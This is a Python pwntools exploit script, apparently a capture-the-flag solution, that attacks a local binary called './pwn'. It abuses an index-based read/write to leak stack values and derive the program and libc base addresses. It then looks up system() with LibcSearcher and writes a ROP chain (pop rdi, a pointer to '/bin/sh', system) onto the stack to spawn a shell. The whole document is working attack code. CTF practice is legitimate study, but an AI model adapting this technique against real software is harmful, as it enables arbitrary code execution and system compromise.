from pwn import *
from LibcSearcher import *
io = process('./pwn')
context.log_level = 'debug'
target = 344

io.recv()
io.sendline('/bin/sh\x00')
count = 0
def writeuseless(flag):
	global count
	num = 41-count
	while num > 0:
		io.recvuntil('index\n')
		io.sendline('0')
		io.recvuntil('value\n')
		io.sendline('0')
		num -= 1
	io.recvuntil('no)? \n')
	if flag == 1:
		io.sendline('yes')
	else:
		io.sendline('no')
	count = 0

def write(address,target):
	num = 8
	string = ''
	leak=''
	data = 0
	while num > 0:
		io.recvuntil('index\n')
		#gdb.attach(io,'b *0x555555554BB7')
		#raw_input()
		io.sendline(str(target))
		length = len('now value(hex) ')
		string = io.recvline()[length:-1]
		if len(string) > 2:
			string = string[-2:]
		leak += string[::-1]
		io.recvuntil('value\n')
		if address == 0:
			io.sendline(str(int('0x'+string,16)))
		else:
			data = address % 0x100
			address = address // 0x100
			io.sendline(str(int(data)))
		target += 1
		num -= 1
	global count
	count += 8
	return leak[::-1]

main_base = int('0x'+write(0,344),16)-0xB11
libc_addr = int('0x'+write(0,344+288),16)-240
stack_addr = int('0x'+write(0,344+288+16),16)-504
log.success("main_base: "+hex(main_base))
log.success("libc_addr: "+hex(libc_addr))
obj = LibcSearcher('__libc_start_main',libc_addr)
libc_base = libc_addr - obj.dump('__libc_start_main')
sys_addr = obj.dump('system') + libc_base
log.success("system_addr: "+hex(sys_addr))
pop_rdi = 0xd03 + main_base
log.success("stack_addr: "+hex(stack_addr))


writeuseless(1)
gdb.attach(io,'b *'+hex(main_base//0x1000)+'C9B')
raw_input()
write(pop_rdi,344)
write(pop_rdi,344+16)
write(stack_addr,344+24)
write(sys_addr,344+32)
writeuseless(0)
io.interactive()

